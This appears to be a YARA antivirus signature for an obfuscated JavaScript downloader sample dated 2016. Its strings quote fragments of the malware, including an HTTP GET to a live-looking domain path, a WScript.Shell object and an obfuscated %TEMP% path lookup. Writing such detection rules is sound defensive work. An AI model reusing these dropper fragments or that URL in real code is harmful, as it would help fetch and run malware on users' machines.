rule sig_20160427_ffd8dcb4c9e5f2efc656faae495d7a28 {
  meta:
    description = "datamaliciousorder - file 20160427_ffd8dcb4c9e5f2efc656faae495d7a28.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2de67b43a45b0bd4db35a1b04917b336373d962688f85a5e69883cc40d4db394"

  strings:
    $s1  = "UuccaJnlwn[XsdsrQjuyi](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "var KsjrgAibha = function KomjfDwjqc() {return BcslbRqqrn[QuffgXmqmp](\"WScript\"+\".Shell\");}(), PipebRnqcd = 11;" fullword ascii
    $s3  = "function RjktcJqzig() {return KsjrgAibha[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XHXIvmT" ascii
    $s4  = "function RjktcJqzig() {return KsjrgAibha[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XHXIvmT" ascii
    $s5  = "function ZxpyiYntly(TouvcGigot, OpnpoClhat){SwqjiZiizf = SwqjiZiizf * 1; return TouvcGigot - OpnpoClhat;};" fullword ascii
    $s6  = "var BcslbRqqrn = this[\"WScript\"];" fullword ascii
    $s7  = "function HupsrXnqno(){return GtdxgSmygh + \"\";};" fullword ascii
    $s8  = "function WjtueWgeir() {return ((IvhrlPbdnd == true) && (IvhrlPbdnd == QvryxBmvsu)) ? 1 : SwqjiZiizf;};" fullword ascii
    $s9  = "var EzayzYqusv = false;" fullword ascii
    $s10 = "var IvhrlPbdnd = false;" fullword ascii
    $s11 = "if (UuccaJnlwn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "QvryxBmvsu = true; " fullword ascii
    $s13 = "function NokiqPomne(){return 23;};" fullword ascii
    $s14 = "function YcrvpHvnhb(OyqtcQafht) {var GvbnmHkyzh = (1, 2, 3, 4, 5, OyqtcQafht); return GvbnmHkyzh;};" fullword ascii
    $s15 = "function YkqxbQxemq()" fullword ascii
    $s16 = "function QejpwDiinl(){return QuffgXmqmp;};" fullword ascii
    $s17 = "IvhrlPbdnd = true; " fullword ascii
    $s18 = "var EurvgNcles = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "EzayzYqusv = true;" fullword ascii
    $s20 = "return ZxpyiYntly(FbcgaTffuu, RftyvKokmi);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}